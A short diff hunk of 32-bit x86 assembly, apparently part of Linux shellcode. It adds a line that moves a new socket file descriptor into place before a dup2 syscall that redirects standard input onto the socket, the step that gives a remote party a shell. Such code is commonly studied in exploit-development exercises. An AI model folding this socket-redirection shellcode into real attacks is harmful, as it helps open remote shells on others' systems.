@@ -44,7 +44,7 @@ int 0x80
 
 
 ;DUP2
-
+mov eax, ebx       ; new socket FD
 xor ecx, ecx       ;making ecx zero for stdin
 mov al, 0x3f       ; Dup2 syscall in hex
 int 0x80           
